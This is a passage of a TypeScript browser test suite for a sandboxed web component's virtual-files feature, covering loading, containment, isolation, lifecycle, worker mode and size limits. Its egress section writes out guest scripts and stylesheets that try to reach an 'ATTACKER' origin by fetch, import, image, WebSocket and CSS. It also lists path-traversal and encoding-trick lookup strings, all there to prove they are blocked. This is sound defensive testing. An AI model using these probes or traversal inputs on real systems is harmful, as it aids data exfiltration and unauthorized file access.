import { test, expect, type SandboxDriver, type FileSpec } from './fixture';
import { MAX_TOTAL_BYTES, mimeTypeFor } from '@src/lib/files';
import { useRecorder, wss } from './recorder';

/**
 * Files (ADR-004): the host registers files on the element, every environment build snapshots them
 * into the guest bootstrap, and the guest gets them as blob: URLs created in its own realm, through
 * the global `sandboxFiles`. Each test names the guarantee it proves:
 *   1. every load type works from a file, with the type from the extension table and exact bytes
 *   2. containment: a lookup is exact, and anything else is NOT_FOUND; the host refuses bad paths
 *   3. isolation: one sandbox's files and URLs mean nothing in another, or on the host page
 *   4. no egress: files run under the guest policy; the evidence cannot silently miss a request (T5)
 *   5. lifecycle: files belong to the element, the guest sees the snapshot of its build
 *   6. worker mode builds its own blobs and sandboxFiles
 *   7. size: the cap loads in every engine, one byte more is refused on the host
 *   8. markup references: guest markup that names a registered file loads it with parser order intact,
 *      and every other reference fails closed (iframe mode only: worker mode has no markup)
 *   9. module graph: registered modules import each other by relative path through one import map,
 *      a module is evaluated once however it is reached, and every unsupported form fails closed
 *  10. CSS references and srcset: stylesheets and inline styles name files by url() and @import,
 *      srcset by candidate; a reference cycle and every unmatched reference fail closed
 */

// The listener outside the browser for the egress tests (sections 4, 9 and 10, backlog T5).
const recorder = useRecorder();

// The NOT_FOUND refusal exactly as guest code sees it: a plain Error with an own code, and a message
// that names nothing but the code.
const NOT_FOUND = { isError: true, code: 'NOT_FOUND', keys: ['code'], message: '[sandboxFiles] NOT_FOUND: no such file' };

// Guest-side helper source: describes a thrown or rejected value.
const SHAPE = `const shape = (e) => ({ isError: e instanceof Error, code: e && e.code, keys: e && typeof e === 'object' ? Object.keys(e) : null, message: e && e.message });`;

let guestRuns = 0;
/** Runs `body` (an async function body) inside the guest via execute() and returns its JSON result. */
async function inGuest<T = any>(sandbox: SandboxDriver, body: string, timeout = 15000): Promise<T> {
    const tag = `FILES_RESULT_${++guestRuns} `;
    await sandbox.run(`${SHAPE} (async () => { ${body} })().then(
        v => console.log(${JSON.stringify(tag)} + JSON.stringify(v)),
        e => console.log(${JSON.stringify(tag)} + JSON.stringify({ thrown: String(e && e.stack || e) })))`);
    const line = await sandbox.waitForLog(tag, timeout);
    return JSON.parse(line.slice(tag.length));
}

const base64 = (bytes: Uint8Array) => Buffer.from(bytes).toString('base64');
const ALL_BYTES = Uint8Array.from({ length: 256 }, (_, i) => i);

// A 304-byte WOFF2 with one glyph ("A", 4 em wide), the same as in blob-delivery.spec.ts: the width
// tells "font applied" apart from a fallback font.
const FONT_WOFF2_B64 = 'd09GMgABAAAAAAEwAAoAAAAAAowAAADpAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAABmAANAowQgE2AiQDCAsGAAQgBWYHJhvjARAeB7k56pLDFCnWfE6J578/zHP/f1tT6ngFDnWwCAZ8TZYgDTMhaNyqblM8Hs/b4xOfzkgaEQTCoMQRhHx63CIIsOXalgQeGBRwFlAEpwsdDrqxs2Q52OSYo80T9fFdNlCKAjhOccr7FpjfArglGzo2u8GmsoVSgtP/f+383wiABgoNYywCCkSqMljisVm5eLng4osLIAjnu82mHbyOe3+E++ensUcr83aBroHQt/6xMgceIFpe8pWgKQFNi7KfhzFBQDMy0aUmYt2qUWmW7ZyxC3ea/aR+QAK1AsO1QYLjexZS6O57AA==';

const LOAD_FILES: Record<string, FileSpec> = {
    'scripts/classic.js': 'globalThis.__classicRan = (globalThis.__classicRan || 0) + 1;',
    'mod/single.js': "export const v = 'module-ran';",
    'style.css': '#probe { width: 123px; }',
    'logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="7" height="9"></svg>',
    'font.woff2': { base64: FONT_WOFF2_B64 },
    'data.json': '{"answer":42,"text":"héllo"}',
    'bytes.bin': { base64: base64(ALL_BYTES) },
};

test.describe('1. every load type works from a registered file', () => {
    test('classic script, import() of a module, stylesheet, SVG image, WOFF2 font, fetch, byte-exact read; each blob carries its table type; no violation', async ({ sandbox }) => {
        expect(await sandbox.registerFiles(LOAD_FILES)).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const r = await inGuest(sandbox, `
            const violations = [];
            addEventListener('securitypolicyviolation', e => violations.push(e.effectiveDirective));
            const r = { list: sandboxFiles.list() };
            r.classic = await new Promise(res => {
                const s = document.createElement('script');
                s.src = sandboxFiles.url('scripts/classic.js');
                s.onload = () => res(globalThis.__classicRan === 1 ? 'ran' : 'loaded-not-run');
                s.onerror = () => res('error');
                document.head.appendChild(s);
            });
            r.module = await import(sandboxFiles.url('mod/single.js')).then(m => m.v, e => 'error:' + e.name);
            document.body.insertAdjacentHTML('beforeend', '<div id="probe"></div><span id="glyph" style="font: 16px probefont, monospace">A</span>');
            r.stylesheet = await new Promise(res => {
                const l = document.createElement('link');
                l.rel = 'stylesheet';
                l.href = sandboxFiles.url('style.css');
                l.onload = () => res(getComputedStyle(document.getElementById('probe')).width);
                l.onerror = () => res('error');
                document.head.appendChild(l);
            });
            r.svg = await new Promise(res => {
                const i = new Image();
                i.onload = () => res(i.naturalWidth + 'x' + i.naturalHeight);
                i.onerror = () => res('error');
                i.src = sandboxFiles.url('logo.svg');
            });
            const style = document.createElement('style');
            style.textContent = '@font-face { font-family: probefont; src: url(' + sandboxFiles.url('font.woff2') + '); }';
            document.head.appendChild(style);
            r.font = await document.fonts.load('16px probefont').then(
                () => document.getElementById('glyph').getBoundingClientRect().width > 50 ? 'applied' : 'fallback', e => 'error:' + e.name);
            r.fetch = await fetch(sandboxFiles.url('data.json')).then(x => x.json());
            r.text = await sandboxFiles.text('data.json');
            const bytes = await sandboxFiles.read('bytes.bin');
            r.read = bytes instanceof Uint8Array && bytes.length === 256 && bytes.every((b, i) => b === i) ? 'exact' : Array.from(bytes).join(',');
            bytes[0] = 7;
            r.freshCopy = (await sandboxFiles.read('bytes.bin'))[0];
            r.types = {};
            for (const path of sandboxFiles.list()) r.types[path] = (await (await fetch(sandboxFiles.url(path))).blob()).type;
            r.urls = sandboxFiles.list().every(p => /^blob:null\\//.test(sandboxFiles.url(p))) ? 'guest-realm' : sandboxFiles.list().map(p => sandboxFiles.url(p));
            r.stableUrl = sandboxFiles.url('logo.svg') === sandboxFiles.url('logo.svg');
            await new Promise(res => setTimeout(res, 100)); // violation events are queued as tasks
            r.violations = violations;
            return r;
        `);

        const paths = Object.keys(LOAD_FILES).sort();
        expect(r).toEqual({
            list: paths,
            classic: 'ran',
            module: 'module-ran',
            stylesheet: '123px',
            svg: '7x9',
            font: 'applied',
            fetch: { answer: 42, text: 'héllo' },
            text: '{"answer":42,"text":"héllo"}',
            read: 'exact',
            freshCopy: 0,
            types: Object.fromEntries(paths.map(p => [p, mimeTypeFor(p)])),
            urls: 'guest-realm',
            stableUrl: true,
            violations: [],
        });
    });

    test('without scriptUnsafe, the first guest script already has sandboxFiles: files exist before any guest markup runs', async ({ sandbox, page }) => {
        await sandbox.exposeHost('report', '(value) => { (window.reports ||= []).push(value); return true; }');
        expect(await sandbox.registerFiles({ 'app.js': "bridge.call('report', 'app.js ran; files: ' + sandboxFiles.list().join(','));" })).toBe('ok');
        expect(await sandbox.mount({ scriptUnsafe: false, html: `<script>
            bridge.call('report', 'first script: ' + typeof sandboxFiles);
            const s = document.createElement('script');
            s.src = sandboxFiles.url('app.js');
            document.head.appendChild(s);
        </script>` })).toBe('ready');
        await page.waitForFunction(() => (window as any).reports?.length === 2);
        expect(await page.evaluate(() => (window as any).reports)).toEqual(['first script: object', 'app.js ran; files: app.js']);
    });
});

// Lookups that must not reach a.js or dir/b.txt: other spellings, traversal, encodings, other types.
const LOOKUP_CORPUS = [
    'A.js', 'a.JS', 'a.js/', './a.js', '../a.js', '/a.js', 'dir/../a.js', '..', '.', '',
    'dir//b.txt', 'dir/./b.txt', '/dir/b.txt', 'dir\\b.txt', 'b.txt', 'dir', 'dir/',
    '%2e%2e/a.js', '%2E%2E/a.js', '..%2fa.js', 'a%2Ejs', 'dir%2Fb.txt',
    'https://vfs.invalid/a.js', '//a.js', 'c:/a.js', 'a.js?x', 'a.js#x', ' a.js', 'a.js ', 'a.js\t', 'a.js\n', 'a.js\u0000',
    '\uFF0E\uFF0E/a.js', 'toString', '__proto__', 'constructor', 'hasOwnProperty', 'valueOf',
];

test.describe('2. containment', () => {
    test('every lookup other than an exact registered path is NOT_FOUND, minted in the guest, for url(), read() and text(); list() is unchanged', async ({ sandbox }) => {
        expect(await sandbox.registerFiles({ 'a.js': 'void 0', 'dir/b.txt': 'b' })).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const r = await inGuest(sandbox, `
            const corpus = ${JSON.stringify(LOOKUP_CORPUS)};
            // non-strings, and a.js's own blob: URL used as a path
            corpus.push(null, undefined, 42, { toString: () => 'a.js' }, ['a.js'], sandboxFiles.url('a.js'));
            const outcomes = [];
            for (const path of corpus) {
                let url;
                try { sandboxFiles.url(path); url = 'returned'; } catch (e) { url = shape(e); }
                const read = await sandboxFiles.read(path).then(() => 'resolved', shape);
                const text = await sandboxFiles.text(path).then(() => 'resolved', shape);
                outcomes.push({ url, read, text });
            }
            return { outcomes, list: sandboxFiles.list(), exact: await sandboxFiles.text('dir/b.txt') };
        `);
        expect(r.outcomes).toHaveLength(LOOKUP_CORPUS.length + 6);
        for (const outcome of r.outcomes) expect(outcome).toEqual({ url: NOT_FOUND, read: NOT_FOUND, text: NOT_FOUND });
        expect(r.list).toEqual(['a.js', 'dir/b.txt']);
        expect(r.exact).toBe('b');
    });

    test('the host refuses an invalid path with INVALID_PATH and the whole batch changes nothing, on the host or in the next guest', async ({ sandbox, page }) => {
        expect(await sandbox.registerFiles({ 'keep.js': 'void 0' })).toBe('ok');
        const bad = ['../x.js', './x.js', '/x.js', 'a//b.js', 'a/', 'a\\b.js', '%2e%2e/x.js', '..%2fx.js', 'c:/x.js', '//h/x.js', 'https:x.js', 'x?y', 'x#y', 'a\tb', 'a\nb', 'a b', 'a\u0000b', '\uFF0E\uFF0E/x.js', 'x'.repeat(257)];
        for (const path of bad) {
            expect(await sandbox.registerFiles({ 'new.js': 'void 0', [path]: 'x' })).toBe('INVALID_PATH');
        }
        expect(await page.evaluate(() => (document.querySelector('web-sandbox') as any).listFiles())).toEqual([{ path: 'keep.js', type: 'text/javascript', size: 6 }]);
        expect(await sandbox.mount()).toBe('ready');
        expect(await inGuest(sandbox, 'return sandboxFiles.list();')).toEqual(['keep.js']);
    });
});

test.describe('3. isolation between sandboxes and from the host page', () => {
    test("one sandbox's blob: URL loads neither in a second sandbox nor on the host page; each lists only its own files; the guest document carries no host identifier and no <base>", async ({ sandbox, page }) => {
        expect(await sandbox.registerFiles({ 'secret.txt': 'A-secret' })).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const a = await inGuest(sandbox, `return {
            url: sandboxFiles.url('secret.txt'),
            list: sandboxFiles.list(),
            base: document.querySelector('base'),
            markup: document.documentElement.outerHTML,
        };`);
        expect(a.url).toMatch(/^blob:null\//);
        expect(a.list).toEqual(['secret.txt']);
        expect(a.base).toBeNull();
        expect(a.markup).not.toContain('localhost');
        expect(a.markup).not.toMatch(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i);

        // a second sandbox with files of its own
        expect(await page.evaluate(() => new Promise(resolve => {
            const second = document.createElement('web-sandbox') as any;
            second.id = 'second';
            second.addEventListener('ready', () => resolve('ready'), { once: true });
            second.registerFiles({ 'other.txt': 'B-own' });
            second.setConfig({ capabilities: ['allow-scripts'], scriptUnsafe: true });
            document.body.appendChild(second);
        }))).toBe('ready');
        await page.evaluate((url) => (document.querySelector('#second') as any).execute(`
            const shape = (e) => ({ isError: e instanceof Error, code: e && e.code, keys: e && typeof e === 'object' ? Object.keys(e) : null, message: e && e.message });
            (async () => {
                const r = { list: sandboxFiles.list(), own: await sandboxFiles.text('other.txt') };
                r.fetchOther = await fetch(${JSON.stringify(url)}).then(x => x.text()).then(t => 'loaded:' + t, e => 'error:' + e.name);
                try { sandboxFiles.url('secret.txt'); r.byName = 'returned'; } catch (e) { r.byName = shape(e); }
                r.byUrl = await sandboxFiles.text(${JSON.stringify(url)}).then(() => 'resolved', shape);
                console.log('SECOND ' + JSON.stringify(r));
            })();`), a.url);
        const second = JSON.parse((await sandbox.waitForLog('SECOND ')).slice('SECOND '.length));
        expect(second).toEqual({ list: ['other.txt'], own: 'B-own', fetchOther: 'error:TypeError', byName: NOT_FOUND, byUrl: NOT_FOUND });

        const host = await page.evaluate((url) => fetch(url).then(x => x.text()).then(t => 'loaded:' + t, e => 'error:' + e.name), a.url);
        expect(host).toBe('error:TypeError');
    });
});

test.describe('4. files add no egress', () => {
    // Every attempt targets a listener outside the browser (recorder.ts), which must stay silent; the
    // positive control (last test of this section) sends the same file's attempts to an allowlisted origin.
    const egressFiles = (ATTACKER: string): Record<string, FileSpec> => ({
        // runs from a blob: URL, so under the guest policy: every channel must be refused
        'egress.js': `globalThis.__egress = (async () => {
            const r = {};
            r.fetch = await fetch('${ATTACKER}/fetch').then(() => 'reached', () => 'refused');
            r.import = await import('${ATTACKER}/import.js').then(() => 'reached', () => 'refused');
            r.img = await new Promise(res => { const i = new Image(); i.onload = () => res('reached'); i.onerror = () => res('refused'); i.src = '${ATTACKER}/img.svg'; });
            r.websocket = await new Promise(res => {
                try { const w = new WebSocket('${wss(ATTACKER)}/ws'); w.onopen = () => res('reached'); w.onerror = () => res('refused'); }
                catch (e) { res('refused'); }
            });
            // positive control for the outcome channel: a permitted load reports success
            r.ownFile = await fetch(sandboxFiles.url('egress.js')).then(x => x.ok ? 'reached' : 'refused', () => 'refused');
            return r;
        })();`,
        'import.css': `@import url("${ATTACKER}/import.css");`,
        'background.css': `body { background-image: url("${ATTACKER}/bg.svg"); }`,
    });

    // Loads the three files and reports how each settled, with the violations the guest saw.
    const loadEgressFiles = `
            const violations = [];
            addEventListener('securitypolicyviolation', e => violations.push(e.effectiveDirective + ' ' + e.blockedURI));
            const sheet = (path) => new Promise(res => {
                const l = document.createElement('link');
                l.rel = 'stylesheet';
                l.href = sandboxFiles.url(path);
                l.onload = () => res('loaded');
                l.onerror = () => res('error');
                document.head.appendChild(l);
            });
            const sheets = { import: await sheet('import.css'), background: await sheet('background.css') };
            const script = await new Promise(res => {
                const s = document.createElement('script');
                s.src = sandboxFiles.url('egress.js');
                s.onload = () => res('loaded');
                s.onerror = () => res('error');
                document.head.appendChild(s);
            });
            const outcomes = await globalThis.__egress;
            await new Promise(res => setTimeout(res, 500)); // violation events are queued as tasks
            return { sheets, script, outcomes, violations: [...new Set(violations)].sort() };
        `;

    test('a file run as script or applied as a stylesheet cannot reach a non-allowlisted origin: each attempt is refused AND reported as a CSP violation', async ({ sandbox }) => {
        const ATTACKER = recorder.blocked;
        expect(await sandbox.registerFiles(egressFiles(ATTACKER))).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const r = await inGuest(sandbox, loadEgressFiles);

        // a refused @import fails its whole sheet (an error event) in all three engines; the other sheet loads
        expect(r.sheets).toEqual({ import: 'error', background: 'loaded' });
        expect(r.script).toBe('loaded');
        expect(r.outcomes).toEqual({ fetch: 'refused', import: 'refused', img: 'refused', websocket: 'refused', ownFile: 'reached' });
        // Every refused attempt has its violation, so a request that left and merely failed (DNS, TLS)
        // would show up as a refusal without one and fail this assertion: the evidence cannot miss it.
        expect(r.violations).toEqual([
            `connect-src ${ATTACKER}/fetch`,
            `connect-src ${wss(ATTACKER)}/ws`,
            `img-src ${ATTACKER}/bg.svg`,
            `img-src ${ATTACKER}/img.svg`,
            `script-src-elem ${ATTACKER}/import.js`,
            `style-src-elem ${ATTACKER}/import.css`,
        ]);
        expect(recorder.hits.filter(hit => hit.server === 'blocked')).toEqual([]);
    });

    test('positive control: the same files, with the listener allowlisted, load and reach it with no violation', async ({ sandbox }) => {
        const allowed = recorder.allowed;
        expect(await sandbox.registerFiles(egressFiles(allowed))).toBe('ok');
        // the file types' own blob: sources are added to these directives (file-sources.ts)
        expect(await sandbox.mount({ connectionsAllowed: {
            'script-src': ["'unsafe-inline'", allowed],
            'style-src': ["'unsafe-inline'", allowed],
            'img-src': [allowed],
            'connect-src': [allowed, wss(allowed)],
        } })).toBe('ready');
        const r = await inGuest(sandbox, loadEgressFiles);

        expect(r.sheets).toEqual({ import: 'loaded', background: 'loaded' });
        expect(r.outcomes).toEqual({ fetch: 'reached', import: 'reached', img: 'reached', websocket: 'reached', ownFile: 'reached' });
        expect(r.violations).toEqual([]);
        for (const path of ['/fetch', '/import.js', '/img.svg', '/ws', '/import.css', '/bg.svg']) await recorder.waitFor('allowed', path);
    });
});

test.describe('5. lifecycle: files belong to the element, a guest sees the snapshot of its build', () => {
    test('files survive reset(), load() and setConfig(); registering while ready changes nothing until the next build; unregistering takes effect at the next build', async ({ sandbox, page }) => {
        expect(await sandbox.registerFiles({ 'a.js': '1', 'b.txt': 'b' })).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const list = () => inGuest(sandbox, 'return sandboxFiles.list();');
        expect(await list()).toEqual(['a.js', 'b.txt']);

        expect(await sandbox.reset()).toBe('ready');
        expect(await list()).toEqual(['a.js', 'b.txt']);
        expect(await sandbox.load('<p>new markup</p>')).toBe('ready');
        expect(await list()).toEqual(['a.js', 'b.txt']);
        expect(await sandbox.mount({ connectionsAllowed: { 'connect-src': [] } })).toBe('ready');
        expect(await list()).toEqual(['a.js', 'b.txt']);

        // while ready: the running guest keeps its snapshot
        const events = await page.evaluate(() => {
            const s = document.querySelector('web-sandbox') as any;
            const seen: unknown[] = [];
            s.addEventListener('fileschanged', (e: CustomEvent) => seen.push(e.detail));
            s.registerFiles({ 'c.txt': 'c' });
            s.unregisterFiles(['a.js']);
            return seen;
        });
        expect(events).toEqual([{ paths: ['c.txt'] }, { paths: ['a.js'] }]);
        expect(await inGuest(sandbox, `return { list: sandboxFiles.list(), c: await sandboxFiles.text('c.txt').then(() => 'found', shape), a: await sandboxFiles.text('a.js') };`))
            .toEqual({ list: ['a.js', 'b.txt'], c: NOT_FOUND, a: '1' });

        // the next build sees the store as it is now
        expect(await sandbox.reset()).toBe('ready');
        expect(await inGuest(sandbox, `let a; try { sandboxFiles.url('a.js'); a = 'found'; } catch (e) { a = shape(e); } return { list: sandboxFiles.list(), a, c: await sandboxFiles.text('c.txt') };`))
            .toEqual({ list: ['b.txt', 'c.txt'], a: NOT_FOUND, c: 'c' });

        // a terminated sandbox keeps its files for the next build too
        await page.evaluate(() => (document.querySelector('web-sandbox') as any).terminate('test'));
        expect(await sandbox.reset()).toBe('ready');
        expect(await list()).toEqual(['b.txt', 'c.txt']);

        // with every file gone, the API is still there: an empty list, and every lookup NOT_FOUND
        await page.evaluate(() => (document.querySelector('web-sandbox') as any).unregisterFiles());
        expect(await sandbox.reset()).toBe('ready');
        expect(await inGuest(sandbox, `let b; try { sandboxFiles.url('b.txt'); b = 'found'; } catch (e) { b = shape(e); } return { list: sandboxFiles.list(), b, read: await sandboxFiles.read('b.txt').then(() => 'found', shape) };`))
            .toEqual({ list: [], b: NOT_FOUND, read: NOT_FOUND });
    });

    for (const mode of ['iframe', 'worker'] as const) {
        test(`${mode} mode: a guest built without any file has the same API: list() is empty and every lookup is NOT_FOUND`, async ({ sandbox }) => {
            expect(await sandbox.mount({ mode })).toBe('ready');
            expect(await inGuest(sandbox, `
                let url; try { sandboxFiles.url('a.js'); url = 'returned'; } catch (e) { url = shape(e); }
                return { type: typeof sandboxFiles, list: sandboxFiles.list(), url, read: await sandboxFiles.read('a.js').then(() => 'resolved', shape), text: await sandboxFiles.text('a.js').then(() => 'resolved', shape) };
            `)).toEqual({ type: 'object', list: [], url: NOT_FOUND, read: NOT_FOUND, text: NOT_FOUND });
        });
    }
});

test.describe('6. worker mode', () => {
    test('the worker builds its own blobs and sandboxFiles: importScripts, fetch, read and NOT_FOUND all work inside it', async ({ sandbox }) => {
        expect(await sandbox.registerFiles({
            'lib/w.js': 'globalThis.__workerLib = (globalThis.__workerLib || 0) + 1;',
            'data.json': '{"from":"worker"}',
            'bytes.bin': { base64: base64(ALL_BYTES) },
        })).toBe('ok');
        expect(await sandbox.mount({ mode: 'worker' })).toBe('ready');
        const r = await inGuest(sandbox, `
            const r = { scope: typeof document === 'undefined' ? 'worker' : 'document', list: sandboxFiles.list() };
            importScripts(sandboxFiles.url('lib/w.js'));
            r.importScripts = globalThis.__workerLib;
            r.fetch = await fetch(sandboxFiles.url('data.json')).then(x => x.json());
            const bytes = await sandboxFiles.read('bytes.bin');
            r.read = bytes.length === 256 && bytes.every((b, i) => b === i) ? 'exact' : 'wrong';
            r.url = /^blob:null\\//.test(sandboxFiles.url('lib/w.js'));
            try { sandboxFiles.url('../lib/w.js'); r.missing = 'returned'; } catch (e) { r.missing = shape(e); }
            r.missingRead = await sandboxFiles.read('w.js').then(() => 'resolved', shape);
            return r;
        `);
        expect(r).toEqual({
            scope: 'worker',
            list: ['bytes.bin', 'data.json', 'lib/w.js'],
            importScripts: 1,
            fetch: { from: 'worker' },
            read: 'exact',
            url: true,
            missing: NOT_FOUND,
            missingRead: NOT_FOUND,
        });
    });
});

test.describe('7. size: the cap is what every engine loads', () => {
    for (const mode of ['iframe', 'worker'] as const) {
        test(`${mode} mode: files totalling exactly the cap load byte-exact; one byte more is refused on the host with FILES_QUOTA_EXCEEDED`, async ({ sandbox, page }) => {
            test.setTimeout(120000);
            // Pseudo-random bytes (incompressible), generated in the page so 8 MiB never crosses the
            // test protocol; an FNV-1a hash on both sides proves the bytes arrived intact.
            const host = await page.evaluate((total) => {
                const fill = (length: number, seed: number) => {
                    const bytes = new Uint8Array(length);
                    let x = seed;
                    for (let i = 0; i < length; i++) { x ^= x << 13; x ^= x >>> 17; x ^= x << 5; bytes[i] = x & 0xff; }
                    return bytes;
                };
                const fnv = (bytes: Uint8Array) => { let h = 0x811c9dc5; for (const b of bytes) { h ^= b; h = Math.imul(h, 0x01000193) >>> 0; } return h; };
                const small = fill(4096, 7);
                const big = fill(total - small.length, 11);
                const s = document.querySelector('web-sandbox') as any;
                const started = performance.now();
                s.registerFiles({ 'big.bin': big, 'small.bin': small });
                const registerMs = Math.round(performance.now() - started);
                let overCode: unknown = 'no refusal';
                try { s.registerFiles({ 'one-more.bin': new Uint8Array(1) }); } catch (e: any) { overCode = e.code; }
                let growCode: unknown = 'no refusal';
                try { s.registerFiles({ 'small.bin': fill(small.length + 1, 7) }); } catch (e: any) { growCode = e.code; }
                return { hashes: { big: fnv(big), small: fnv(small) }, overCode, growCode, registerMs, files: s.listFiles() };
            }, MAX_TOTAL_BYTES);
            expect(host.overCode).toBe('FILES_QUOTA_EXCEEDED');
            expect(host.growCode).toBe('FILES_QUOTA_EXCEEDED');
            expect(host.files).toEqual([
                { path: 'big.bin', type: 'application/octet-stream', size: MAX_TOTAL_BYTES - 4096 },
                { path: 'small.bin', type: 'application/octet-stream', size: 4096 },
            ]);

            const started = Date.now();
            expect(await sandbox.mount({ mode })).toBe('ready');
            const readyMs = Date.now() - started;
            const guest = await inGuest(sandbox, `
                const fnv = (bytes) => { let h = 0x811c9dc5; for (const b of bytes) { h ^= b; h = Math.imul(h, 0x01000193) >>> 0; } return h; };
                const big = await sandboxFiles.read('big.bin');
                const small = await sandboxFiles.read('small.bin');
                return { sizes: [big.length, small.length], hashes: { big: fnv(big), small: fnv(small) } };
            `, 60000);
            expect(guest).toEqual({ sizes: [MAX_TOTAL_BYTES - 4096, 4096], hashes: host.hashes });
            const srcdocLength = await page.evaluate(() => (document.querySelector('web-sandbox') as any).shadowRoot.querySelector('iframe').srcdoc.length);
            test.info().annotations.push({ type: 'size', description: `${mode}: register ${host.registerMs} ms, ready ${readyMs} ms, wrapper srcdoc ${srcdocLength} chars` });
        });
    }
});

test.describe('8. markup references: guest markup that names a registered file loads it (iframe mode; worker mode has no markup)', () => {
    const MARKUP_FILES: Record<string, FileSpec> = {
        'a.js': "__order.push('a:' + document.currentScript.id);",
        'b.js': "__order.push('b:' + document.currentScript.id);",
        'defer.js': "__order.push('defer:' + document.currentScript.id + ':' + document.readyState);",
        'async.js': "__async = 'async:' + document.currentScript.id;",
        'mod/main.js': "__order.push('module:' + (import.meta.url.startsWith('blob:null/') ? 'blob' : import.meta.url) + ':' + document.currentScript);",
        'style.css': '#probe { width: 123px; }',
        'logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="7" height="9"></svg>',
        'img/x.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="5" height="3"></svg>',
    };

    // A full document, as the playground's "Run (Virtual-Files)" loads one. Every reference names a file:
    // by bare relative path, with "./", from the root with "/", and in a subdirectory.
    const DOCUMENT = `<!DOCTYPE html>
<html lang="en">
<head>
    <title>markup references</title>
    <script>
        window.__order = []; window.__async = null; window.__violations = [];
        addEventListener('securitypolicyviolation', e => __violations.push(e.effectiveDirective + ' ' + e.blockedURI));
    </script>
    <link rel="stylesheet" href="style.css">
    <script id="sa" src="a.js"></script>
    <script>__order.push('inline');</script>
    <script id="sb" src="./b.js"></script>
    <script id="sd" defer src="defer.js"></script>
    <script type="module" src="/mod/main.js"></script>
    <script id="sy" async src="async.js"></script>
</head>
<body class="page">
    <div id="probe"></div>
    <script>
        // The ordering guarantee is about the CSSOM: a script-blocking stylesheet has loaded (its rules are
        // there) before the next parser-inserted script runs. Computed layout values are not evidence of
        // that: Firefox can report '' for them while it has not yet styled the frame (seen under load),
        // so the applied width is read once the document has loaded (READ_DOCUMENT).
        const rules = () => [...document.styleSheets].map(sheet => sheet.cssRules.length).join(',');
        __order.push('probe:rules=' + rules());
        document.addEventListener('DOMContentLoaded', () => __order.push('DOMContentLoaded:rules=' + rules()));
    </script>
    <img id="i1" src="logo.svg"><img id="i2" src="./img/x.svg"><img id="i3" src="/img/x.svg">
</body>
</html>`;

    const READ_DOCUMENT = `
        if (document.readyState !== 'complete') await new Promise(res => addEventListener('load', res, { once: true }));
        await new Promise(res => setTimeout(res, 100)); // violation events are queued as tasks
        const img = (id) => { const i = document.getElementById(id); return { size: i.complete ? i.naturalWidth + 'x' + i.naturalHeight : 'pending', src: i.getAttribute('src') }; };
        const head = [...document.head.children];
        return {
            width: getComputedStyle(document.getElementById('probe')).width,
            order: __order,
            async: __async,
            violations: __violations,
            images: { i1: img('i1'), i2: img('i2'), i3: img('i3') },
            urls: { logo: sandboxFiles.url('logo.svg'), x: sandboxFiles.url('img/x.svg'), a: sandboxFiles.url('a.js') },
            scriptSrc: document.getElementById('sa').getAttribute('src'),
            lang: document.documentElement.lang,
            bodyClass: document.body.className,
            title: document.title,
            first: head[0] && head[0].outerHTML.startsWith('<meta http-equiv="Content-Security-Policy"'),
            // after the policy: DNS prefetching off (broad review PD3), then the bootstrap
            second: !!head[1] && head[1].httpEquiv === 'x-dns-prefetch-control' && !!head[2] && head[2].tagName === 'SCRIPT' && !head[2].hasAttribute('src') && head[2].textContent.includes('document.write'),
            stray: document.querySelectorAll('[src*="vfs-slot"], [href*="vfs-slot"]').length + (document.documentElement.outerHTML.includes('vfs-slot-') ? 1 : 0),
        };
    `;

    test('a full document: sync, inline, defer, module and async scripts keep parser order and currentScript; the stylesheet applies before the next script and by DOMContentLoaded; images by relative, ./ and / paths; the CSP meta stays first', async ({ sandbox }) => {
        expect(await sandbox.registerFiles(MARKUP_FILES)).toBe('ok');
        expect(await sandbox.mount({ html: DOCUMENT })).toBe('ready');
        const r = await inGuest(sandbox, READ_DOCUMENT);
        expect(r).toEqual({
            width: '123px',
            order: ['a:sa', 'inline', 'b:sb', 'probe:rules=1', 'defer:sd:interactive', 'module:blob:null', 'DOMContentLoaded:rules=1'],
            async: 'async:sy',
            violations: [],
            images: {
                i1: { size: '7x9', src: r.urls.logo },
                i2: { size: '5x3', src: r.urls.x },
                i3: { size: '5x3', src: r.urls.x },
            },
            urls: r.urls,
            scriptSrc: r.urls.a,
            lang: 'en',
            bodyClass: 'page',
            title: 'markup references',
            first: true,
            second: true,
            stray: 0,
        });
        expect(Object.values(r.urls).every(url => /^blob:null\//.test(url as string))).toBe(true);
    });

    test('load() of a fragment rewrites too, and the fragment lands where the same fragment lands without file references', async ({ sandbox }) => {
        expect(await sandbox.registerFiles(MARKUP_FILES)).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        // One fragment, loaded twice: with a reference to a registered file (rewritten and written by the
        // bootstrap) and with one to an unregistered file (embedded verbatim, today's path). Apart from the
        // src value and the bootstrap script, the parsed documents must be the same.
        const fragment = (src: string) => `<title>t</title><meta name="x" content="y"><style>p { color: red }</style>
<!-- a comment --><link rel="icon" href="${src}"><p class="lead">text &amp; more</p><img id="i" alt="a" src="${src}"><template><img src="${src}"></template>
<table><tr><td>cell</td></tr></table><script>window.__ran = (window.__ran || 0) + 1;</script>`;
        const shape = `
            if (document.readyState !== 'complete') await new Promise(res => addEventListener('load', res, { once: true }));
            const img = document.getElementById('i');
            const src = img.getAttribute('src');
            const strip = (html) => html.split(src).join('SRC').split('logo.svg').join('SRC').split('unregistered.svg').join('SRC');
            const head = [...document.head.children].slice(3).map(e => e.outerHTML); // after the CSP meta, the DNS-prefetch switch and the bootstrap
            return { head: strip(head.join('')), body: strip(document.body.outerHTML), template: document.querySelector('template').innerHTML, ran: __ran, loaded: img.complete && img.naturalWidth > 0, srcIsBlob: src.startsWith('blob:null/') };
        `;
        expect(await sandbox.load(fragment('logo.svg'))).toBe('ready');
        const rewritten = await inGuest(sandbox, shape);
        expect(await sandbox.load(fragment('unregistered.svg'))).toBe('ready');
        const verbatim = await inGuest(sandbox, shape);

        expect(rewritten).toMatchObject({ ran: 1, loaded: true, srcIsBlob: true });
        expect(verbatim).toMatchObject({ ran: 1, loaded: false, srcIsBlob: false });
